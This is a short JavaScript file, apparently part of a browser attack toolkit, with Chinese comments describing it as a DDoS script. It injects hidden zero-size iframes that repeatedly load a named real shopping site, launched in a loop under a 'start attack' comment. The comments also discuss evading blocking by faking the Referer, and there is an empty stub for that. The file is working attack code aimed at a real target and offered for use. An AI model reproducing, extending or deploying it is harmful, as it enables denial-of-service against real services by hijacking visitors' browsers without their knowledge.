//alert("ddos.js");
////////////////////////////////////////////
//// 构造多个隐藏iframe,请求远程页面
//// 需要改进,用iframe无法隐藏Referer,很容易被屏蔽
//// iframe在IE中会拦截cookie,有些页面无法DDOS到
//// Author: axis
////////////////////////////////////////////
var target = "http://www.taobao.com";

function ddosIframe(target){
	var t = $d.createElement("iframe");
	t.src = target;
	t.width = 0;
	t.height = 0;
	$d.getElementsByTagName("body")[0].appendChild(t);	
	
	//$d.getElementsByTagName("body")[0].removeChild(t);
}


function ddosIframeFakeReferer(target){
	
}


///////////////////////////////////////////
///// 开始攻击
var i = 0;
do {
	setTimeout("ddosIframe(target)", 200);
	i = i+1;
}
while (i<=10);
